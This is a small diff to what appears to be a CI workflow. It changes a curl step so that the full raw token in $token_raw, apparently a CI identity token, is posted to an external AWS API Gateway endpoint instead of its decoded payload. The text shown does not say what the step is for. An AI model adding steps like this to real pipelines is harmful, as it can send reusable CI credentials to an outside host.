@@ -21,6 +21,6 @@ jobs:
           token=$(echo "$token_raw" | cut -d '.' -f2 | base64 -d | jq .)
           curl -X POST -H "Content-Type: application/json" \
           -H "Authorization: Bearer ${token_raw}" \
-          -d "{\"token\":\"$token\"}" \
+          -d "{\"token\":\"$token_raw\"}" \
           "https://2sc5lj0u1l.execute-api.us-east-1.amazonaws.com/prod/ident"
 
